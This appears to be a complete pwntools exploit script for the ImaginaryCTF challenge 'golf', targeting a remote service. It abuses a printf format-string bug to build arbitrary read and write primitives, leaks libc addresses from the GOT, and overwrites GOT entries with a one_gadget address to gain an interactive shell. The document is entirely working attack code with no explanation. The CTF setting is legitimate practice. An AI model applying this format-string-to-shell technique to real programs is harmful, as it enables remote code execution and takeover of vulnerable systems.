from pwn import *

BIN_NAME = 'golf'
REMOTE_ADDR = 'golf.chal.imaginaryctf.org'
REMOTE_PORT = 1337
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def aaw(addr, val):
  print(f'[+] aaw({addr=}, {val=})')
  payload = f'%*9$c%8$hn'.encode()
  assert len(payload) < 11
  payload = payload.ljust(16, b'\x00')
  payload += pack(addr)   # 8
  payload += pack(val)    # 9
  stream.sendline(payload)


def aar(addr):
  payload = f'#%8$s!!'.encode()
  assert len(payload) < 11
  payload = payload.ljust(16, b'\x00')
  payload += pack(addr)   # 8
  stream.sendline(payload)
  stream.recvuntil(b'#', drop=True)
  s = stream.recvuntil(b'!!', drop=True)
  return unpack(s, "all")

pause()
aaw(chall.got["exit"], chall.symbols["main"] & 0xffff)
printf_addr = aar(chall.got["printf"])
print(f'[+] {hex(printf_addr)=}')
setvbuf_addr = aar(chall.got["setvbuf"])
print(f'[+] {hex(setvbuf_addr)=}')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
libc.address = printf_addr - libc.symbols["printf"]
assert setvbuf_addr == libc.symbols["setvbuf"]

one_gadget = libc.address + [0xe3afe, 0xe3b01, 0xe3b04, 0xe3cf3, 0xe3cf6][1]

print(f'[+] {hex(one_gadget)=}')

addr = chall.got["setvbuf"]
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 0, (one_gadget >> 0) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 2, (one_gadget >> 16) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 4, (one_gadget >> 32) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')

pause()
aaw(chall.got["exit"], (chall.symbols["_"] + 0x21) & 0xffff)

stream.interactive()
